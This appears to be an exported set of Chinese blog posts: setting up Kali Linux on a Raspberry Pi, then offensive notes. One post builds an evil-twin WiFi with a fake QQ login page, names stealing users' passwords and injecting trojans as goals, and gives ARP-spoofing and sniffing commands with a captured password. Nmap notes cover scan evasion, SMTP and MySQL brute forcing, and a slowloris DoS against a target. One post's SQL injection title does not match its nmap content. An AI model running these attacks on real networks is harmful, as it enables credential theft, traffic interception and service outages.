<p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200416130407849.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>用Xshell 6工具去连接ssh<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200416130455310.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200416130544575.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>点击连接然后输入<strong>账号默认是root密码是toor</strong><br>看一下已经连接上去了<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200416130645277.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这个我就用他默认的源</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">deb http:&#x2F;&#x2F;http.kali.org&#x2F;kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http:&#x2F;&#x2F;http.kali.org&#x2F;kali kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure>
<p>运行命令进行更新</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get  update</span><br><span class="line">apt-get  upgrade</span><br></pre></td></tr></table></figure>
<p>安装远程</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt  install xrdp</span><br></pre></td></tr></table></figure>

<p>启动</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systemctl start xrdp</span><br></pre></td></tr></table></figure>
<p>设置开机自启动</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systemctl enable  xrdp</span><br></pre></td></tr></table></figure>

<p>连接<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200416132549991.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>设置中文</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dpkg-reconfigure locales</span><br></pre></td></tr></table></figure>

<p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200416132632601.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>解决乱码问题</strong><br>乱码是应为缺少字体<br>安装字体</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get install xfonts-intl-chinese</span><br><span class="line">apt-get install ttf-wqy-microhei</span><br></pre></td></tr></table></figure>




<h2 id="我QQ2737977997"><a href="#我QQ2737977997" class="headerlink" title="我QQ2737977997"></a>我QQ2737977997</h2>]]></content>
      <categories>
        <category>树莓派kali linux</category>
      </categories>
      <tags>
        <tag>树莓派kali linux</tag>
      </tags>
  </entry>
  <entry>
    <title>用树莓派做移动黑客</title>
    <url>/2020/08/27/2.%20%E6%A0%91%E8%8E%93%E6%B4%BE%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="我玩树莓派的经历"><a href="#我玩树莓派的经历" class="headerlink" title="我玩树莓派的经历"></a>我玩树莓派的经历</h2><p><strong>自学习网络安全也有好几年了</strong></p>
<p><strong>应为我也是才上职高二年级的一个普通的学生，买树莓派也是考虑了很长时间，毕竟是学生党几百块已经算很贵的了，考虑了很长时间就决定买了一个树莓派，</strong></p>
<p><strong>树莓派安装kali在下面的连接查看</strong><br><a href="https://blog.csdn.net/qq_41860876/article/details/105409811"><strong>1. 树莓派安装kali linux和说明</strong></a></p>
<h2 id="设备"><a href="#设备" class="headerlink" title="设备"></a>设备</h2><p>设备有一个树莓派4b4g，<br>支持监听和AP的网卡用来，进行AP发送和连接<br>U盘用来存数据<br>充电宝用来供电<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200409143416347.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200416150348284.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200416173032688.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200416173057535.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="搭建恶意wifi"><a href="#搭建恶意wifi" class="headerlink" title="搭建恶意wifi"></a>搭建恶意wifi</h2><ol>
<li>可以通过恶意wifi从而获得wifi密码<ol>
<li>获取到密码后，可以进行内网渗透，进行破坏就容易的多了</li>
</ol>
</li>
<li>通过恶意wifi盗窃用户密码<ol>
<li>可以抓包获取用户和密码，通过dns欺骗访问指定自己的恶意网页实现键盘记录盗窃密码，等等等等 </li>
</ol>
</li>
<li>通过恶意wif往下载程序里面注入病毒木马</li>
<li>通过恶意wif可以获取个人隐私</li>
</ol>
<p><strong>还有很多就不多说了，</strong></p>
<p>搭建恶意wifi有很多方法<br>有很多种现成的工具，<br>也可以进行手动搭建<br>这个我就用现成的工具了，手动搭建这个文章可能写的很长很长<br>Wifiphisher工具<br><a href="https://github.com/wifiphisher/wifiphisher"><strong>github地址</strong></a></p>
<p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200416153656244.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200416165223437.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>做了一个qq登录的页面</strong><br>应为时间浪费太长我就修改了一下里面的内容,内容有不好</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200416160055172.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="中间人攻击"><a href="#中间人攻击" class="headerlink" title="中间人攻击"></a>中间人攻击</h2><p>中间人攻击也有很多种<br>通过欺骗对方叫流量转发给我然后我在转发出去<br><strong>查看网络里的人</strong><br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200416174024830.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>启动路由转发</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo 1 &gt;&#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;ip_forward</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">arpspoof   -t 目标ip  -r  网关地址</span><br></pre></td></tr></table></figure>
<p><strong>可以加上-i指定网卡</strong></p>
<p>进行arp欺骗<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200416174659711.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>urlsnarf -i wlan0抓取目标访问的网站<br>还有很多<br>成功获取到密码<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200416182046801.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="QQ2737977997"><a href="#QQ2737977997" class="headerlink" title="QQ2737977997"></a>QQ2737977997</h2>]]></content>
      <categories>
        <category>树莓派kali linux</category>
      </categories>
      <tags>
        <tag>用树莓派做移动黑客</tag>
      </tags>
  </entry>
  <entry>
    <title>2. 网易web安全渗透  union联合查询注入</title>
    <url>/2020/08/27/2.%20%E7%BD%91%E6%98%93web%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%20%20union%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="书名诸神之眼NMAP-学习笔记"><a href="#书名诸神之眼NMAP-学习笔记" class="headerlink" title="书名诸神之眼NMAP 学习笔记"></a>书名诸神之眼NMAP 学习笔记</h2><h2 id="nmap-伪装技术"><a href="#nmap-伪装技术" class="headerlink" title="nmap 伪装技术"></a>nmap 伪装技术</h2><ol>
<li><p>数据包分段</p>
<p> 发送的数据包将原理的数据包分成几个部分，防火墙在对数据包进行检查时候会更加困难<br> 注意：一些老的主机会老的系统可能会死机蓝屏</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -f  [目标]</span><br></pre></td></tr></table></figure>
<p> <img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200601151648209.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</li>
<li><p>指定使用的MTU<br> 最大传输单位（MTU），最大的数据包大小<br> 一般来说，以太网的MTU的默认是1500bytes ,如果大于这个数就被分片<br> 用参数–mtu指定大小</p>
</li>
</ol>
<pre><code><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap --mtu [指定的大小]  [目标]</span><br></pre></td></tr></table></figure>
列`nmap --mtu 16  192.168.1.1`
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200601152500955.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70)</code></pre>
<ol start="3">
<li>诱饵主机隐藏扫描<br>就是我伪造多个主机，然后里面就我真实的我，目标就不好判断那个是真实的攻击端了<br>在初始ping扫描（ICMP，SYN，ACK）和-O都可以用这个方法<ol>
<li>指端伪造的ip</li>
</ol>
</li>
</ol>
<pre><code>    <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -D [伪造的ip],[伪造的ip],[伪造的ip]。。。  [目标]</span><br></pre></td></tr></table></figure>
2. 用nmap随机生成伪造源地址


    <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -D RND [伪造源地址数量]   [目标]</span><br></pre></td></tr></table></figure></code></pre>
<ol start="4">
<li><p>源端口欺骗<br> 如果本地端口有限制，就可以利用这个端口进行扫描<br> <code>-g</code>和<code>--source-port</code>这个两个参数其实是一样的</p>
<p> 格式</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -g [伪造的端口]  [目标]</span><br></pre></td></tr></table></figure>

<p>  例如</p>
</li>
</ol>
<pre><code><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -g 53 192.168.1.1</span><br></pre></td></tr></table></figure></code></pre>
<ol start="5">
<li>发送报文时加随机数据<br> nmap发送的数据包只有包头，内容是空的，<br> 可以使用这个参数<code>--data-length </code>进行修改随机内容<br> 格式</li>
</ol>
<pre><code><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap --data-length [要添加的随机数据]  [目标]</span><br></pre></td></tr></table></figure>
例如


<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap --data-length 50  192.168.1.1</span><br></pre></td></tr></table></figure>
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200601155312478.png)</code></pre>
<ol start="6">
<li>TTL设置<br>ttl值Windows 是128(65——128)<br>Linux 和 Unix = 64 (1-64) Unix = 255<br> 格式</li>
</ol>
<pre><code><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap --ttl [tti的值] [目标]</span><br></pre></td></tr></table></figure>
例如


<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap --ttl 50 192.168.1.1</span><br></pre></td></tr></table></figure>
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200601160142850.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70)</code></pre>
<ol start="7">
<li>MAC地址欺骗<br> 格式</li>
</ol>
<pre><code><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap  --spoof-mac [欺骗的MAC地址] [目标]</span><br></pre></td></tr></table></figure>
如果欺骗的MAC地址是0  nmap会选择一个全部随机的MAC地址
如果欺骗的MAC地址是小于12的十六进制的数字，nmap会随机填充后面的6个字节
nmap会通过查询nmap-mac-prefixes查询厂商的名称(区分大小写)
例如


<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap  --spoof-mac 0 192.168.43.1</span><br></pre></td></tr></table></figure>
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200601192954456.png)</code></pre>
<h2 id="TCP完连接（Connect）扫描的检查"><a href="#TCP完连接（Connect）扫描的检查" class="headerlink" title="TCP完连接（Connect）扫描的检查"></a>TCP完连接（Connect）扫描的检查</h2><p>Nmap向一个开放的端口发起了连接请求，并且完成了三次握手，之后结束了这次连接。这种扫描很容易被检测到，如果没有开放目标会返回一个RST，这样断开会产生大量的错误消息，而这些记录会被记录下来<br>例如</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">nmap  -sT [目标]</span><br></pre></td></tr></table></figure>

<p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/2020060119390434.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>出现上面的情况可能就说明是有人在扫描你<br>如果有入侵检测设备就会报警<br>查看最多发的请求<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200601194543776.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="nmap扫描结果保存"><a href="#nmap扫描结果保存" class="headerlink" title="nmap扫描结果保存"></a>nmap扫描结果保存</h2><ol>
<li>txt文件保存参数<code>-oN</code><br> 格式</li>
</ol>
<pre><code><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -oN [*.txt]  [目标]</span><br></pre></td></tr></table></figure></code></pre>
<ol start="2">
<li>XML格式保存参数<code>-oX</code><br>格式</li>
</ol>
<pre><code><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap [*,xml] [目标]</span><br></pre></td></tr></table></figure></code></pre>
<ol start="3">
<li>grep格式保存参数`-oG<br> 格式</li>
</ol>
<pre><code><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -oG [*.gerp]  [目标]</span><br></pre></td></tr></table></figure></code></pre>
<h2 id="NSE的基础部分"><a href="#NSE的基础部分" class="headerlink" title="NSE的基础部分"></a>NSE的基础部分</h2><ol>
<li>NES的脚本的运行，<br> 现在使用NSE脚本进行测试一台服务器添加选项<code>-sC</code><br> 例如</li>
</ol>
<pre><code><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -sV -sC -O scanme.Nmap.org</span><br></pre></td></tr></table></figure></code></pre>
<ol start="2">
<li><p>NMSE中的脚本的分类<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200602080306319.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</li>
<li><p>NSE脚本的选择<br> 脚本的位置在<code>/usr/share/nmap/scripts</code>文件夹里面<br> 用使用脚本<code>--script [脚本的文件名或者是路径文件名]</code> 运行脚本他也支持表达式<br> 列<br> <strong>1.使用nmap来枚举出目标web服务器的支持的HTTP方法</strong></p>
</li>
</ol>
<pre><code><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -p 80 --script http-methods  192.168.30.34 </span><br></pre></td></tr></table></figure>
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200602092801293.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70)
可以看见目标支持的服务有GET HEAD POST OPTIONS

**2.或者也可以使用种类的名字来调用一个分类中的全部脚本**
1. 使用一个safe类型的全部脚本进行扫描
    <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap --script safe 192.168.30.34  </span><br></pre></td></tr></table></figure>


    ![在这里插入图片描述](https://img-blog.csdnimg.cn/20200602093309230.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70)
2. 使用多个脚本进行扫描safe类型和discovery类型的全部脚本进行扫描
例如


    <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap --script safe,discovery 192.168.30.34</span><br></pre></td></tr></table></figure>
**3.-sC参数**
-sC参数它是--scriptDefault的缩写。也就是使用default分类下的脚本对目标进行扫描。
4.有可以指定一个位置进行扫描
例如


<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap  -p 80  --script &#x2F;usr&#x2F;share&#x2F;nmap&#x2F;scripts&#x2F;http-methods.nse 192.168.30.34</span><br></pre></td></tr></table></figure>
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200602094727692.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70)
和上面的`nmap -p 80 --script http-methods  192.168.30.34 `扫描是一样的</code></pre>
<p><strong>4.也可以使用表达式</strong><br>    使用表达式<strong>or，and和not</strong><br>    1. not例<br>        例如想使用除了exploit分类以外的所有脚本对目标进行检测，命令如下</p>
<pre><code>    <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -sV --script &quot;not exploit&quot;  192.168.30.34 </span><br></pre></td></tr></table></figure>
2. or例
如果想使用除了intrusive、dos、exploit分类以外的所有脚本对目标进行检测，命令如下


    <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap  -sV  --script &quot;not (intrusive or dos or exploit)&quot;  192.168.30.34 </span><br></pre></td></tr></table></figure>
3. and例
如果只使用broadcast和discovery分类的脚本对目标进行检测，命令如下


    <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap  -sV --script &quot;broadcast and discovery&quot;  192.168.30.34 </span><br></pre></td></tr></table></figure>
4. 也可以使用*和表达式进行结合
    *是代表所有的意思
    例如希望对一个FTP服务器进行审计，但是不希望使用intrusive分类中的脚本，就可以使用如下命令


    <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap --script &quot;ftp-* and not(intrusive)&quot;  192.168.30.34 </span><br></pre></td></tr></table></figure></code></pre>
<h2 id="了解脚本的原理"><a href="#了解脚本的原理" class="headerlink" title="了解脚本的原理"></a>了解脚本的原理</h2><ol>
<li>如果不仅仅想利用Nmap脚本的强大实力，还想进一步了解脚本的原理，可以使用<code>--script-trace</code>参数**<br>例如</li>
</ol>
<pre><code><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap  -p 80  --script http-methods 192.168.30.34   --script-trace</span><br></pre></td></tr></table></figure>
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200602102532955.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70)


**1.2也可以使用-d[1到9]输出更详细详细，数字大，输出就越详细
    例如**


<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap  -p 80  --script http-methods 192.168.30.34   --script-trace -d3</span><br></pre></td></tr></table></figure>
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200602103054894.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70)</code></pre>
<ol start="2">
<li>使用–packet-trace选项可以查看所有发送和收到的数据包**<br>例如</li>
</ol>
<pre><code><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap  -p 80  --script http-methods 192.168.30.34   --packet-trace</span><br></pre></td></tr></table></figure>

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200602103720510.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70)</code></pre>
<h2 id="NSE常见脚本的应用"><a href="#NSE常见脚本的应用" class="headerlink" title="NSE常见脚本的应用"></a>NSE常见脚本的应用</h2><p>nmap只能进行简单系统检查和服务检查，而NSE实现了大量的高级功能，</p>
<ol>
<li>信息收集类脚本<br> 基于http-methods脚本的审计目的，web服务器支持的http的方法<br> <strong>1. GET：请求指定的页面信息，并返回实体主体</strong><br> <strong>2. HEAD：类似于GET请求，只不过返回的响应中没有具体的内容，用于获取报头。</strong><br> <strong>3. POST：向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。</strong><br> <strong>4. PUT：从客户端向服务器传送的数据取代指定文档的内容。</strong><br> <strong>5. DELETE：请求服务器删除指定的页面。</strong><br> <strong>6. OPTIONS：允许客户端查看服务器的性能。TRACE：回显服务器收到的请求，主要用于测试或诊断。</strong><br> 例如</li>
</ol>
<pre><code><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap  -p 80  --script http-methods 192.168.30.34 </span><br></pre></td></tr></table></figure></code></pre>
<ol start="2">
<li>高级主机发现类脚本<ol>
<li>脚本broadcast-ping.NSE<br> 这个<code>broadcast-ping</code>这个脚本是发现本地的活跃的主机，其实nmap也能实现，nmap是向每个ip发单播探针数据包来实现的<br> broadcast-ping.nse脚本不同的是他是向本地网络中所有的IP地址发送广播包。</li>
<li>脚本targets-sniffer<br><code>targets-sniffer</code>脚本发现本地网络中的所有主机<br>脚本targets-sniffer的审计方法十分特殊，它会对你所在的网络进行嗅探，发现网络中的所有主机。这个脚本需要特权模式，也可以使用-e来执行网络监听的网卡设备，这个不需要指定目标他会检查本地的ip，例如你所在的网络IP地址为192.168.0.0/24<br>例如</li>
</ol>
</li>
</ol>
<pre><code>    <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">nmap --script targets-sniffer  -e eth0</span><br></pre></td></tr></table></figure>
     ![在这里插入图片描述](https://img-blog.csdnimg.cn/20200602112405671.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70)</code></pre>
<ol start="3">
<li>密码审计类脚本<ol>
<li>脚本mysql-brute.NSE<br>在Nmap中有两个数据文件，一个文件中包含一些常见的用户名，另一个文件中包含有一些常见的密码<br>例如</li>
</ol>
</li>
</ol>
<pre><code>    <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -p 3306  --script mysql-brute  192.168.30.39 </span><br></pre></td></tr></table></figure>
    也可以加`--packet-trace`发送和收到的数据包
2. 脚本smtp-brute.NSE
这个脚本可以支持对SMTP密码的暴力穷解，它支持LOGIN、PLAIN、CRAM-MD5、DIGEST-MD5和NTLM四种登录方式。
默认情况下，smtp-brute.NSE使用`/usr/share/nmap/nselib/data/usernames.lst`文件中的各项作为用户名，`/usr/share/nmap/nselib/data/passwords.lst`文件中的各项作为密码。
例如


    <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -p  25  --script   smtp-brute 192.168.30.39 </span><br></pre></td></tr></table></figure>
    如果想指定字典文件可以用下面的命令
    `--script-args `是用来指定参数的


    <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Nmap -p <span class="number">25</span> --script smtp-brute --script-args userdb=用户字典, passdb=密码字典  <span class="number">192.168</span><span class="number">.30</span><span class="number">.39</span> </span><br></pre></td></tr></table></figure>
    **2.1用户模式
    这种模式先取一个用户名，然后使用所有的密码与其配对，所有组合都结束后，再开始下一个用户名**
    例如
    `--script-args `是用来指定参数的

    <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap --script smtp-brute --script-args brute.mode&#x3D;指定的用户名  192.168.30.39 </span><br></pre></td></tr></table></figure>
    **2.2密码模式
    这种模式先取一个密码，然后使用所有的用户名与其配对，当所有组合都结束后，再开始下一个密码**
    例如

    <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap --script smtp-brute --script-args brute.mode&#x3D;指定的密码  192.168.30.39 </span><br></pre></td></tr></table></figure>
    2.3文件格式取用户密码
    这种模式与前两种不同，creds中所有的用户名和密码都写在同一个文件中，格式类似于admin/123456这种形式，Nmap会读取其中的每一行，然后访问服务器进行匹配
    例如

    <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Nmap --script smtp-brute --script-args brute.mode&#x3D;creds,brute.credfile&#x3D;文件名   192.168.30.39 </span><br></pre></td></tr></table></figure></code></pre>
<ol>
<li><p>漏洞扫描类脚本</p>
<ol>
<li><p>脚本http-slowloris.NSE<br> http-slowloris.NSE脚本查看目标是否存在预防slowloris的 DoS攻击<br> Slowloris是在2009年Web安全专家RSnake提出的一种攻击方法，其原理是以极低的速度向服务器发送HTTP请求。由于Web Server对于并发的连接数都有一定的上限，导致拒绝服务<br> 例如<br> <code> --max-parallelism</code>这些选项控制用于主机组的探测报文数量</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -p 80 --script http-slowloris  --max-parallelism 300 192.168.30.39 </span><br></pre></td></tr></table></figure>

<p> 这个方法是直接去打目标系统</p>
</li>
</ol>
<p> <strong>1.1http-slowloris.NSE脚本扩展http-slowloris.send_interval参数</strong></p>
<pre><code> `http-slowloris.send_interval`参数可以指定发送http header datas的间隔，默认值为100
 `--script-args `是用来指定参数的
 ` --max-parallelism`这些选项控制用于主机组的探测报文数量
 例如</code></pre>
</li>
</ol>
<pre><code>    <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Nmap -p <span class="number">80</span> --script http-slowloris --script-args http-slowloris.send_interval=<span class="number">200</span> --max-parallelism <span class="number">300</span>   <span class="number">192.168</span><span class="number">.30</span><span class="number">.39</span> </span><br></pre></td></tr></table></figure>
    **1.2http-slowloris.NSE脚本扩展http-slowloris.timelimit参数**
    攻击时间，默认是30分钟
    `--script-args `是用来指定参数的

    15m就是15分钟
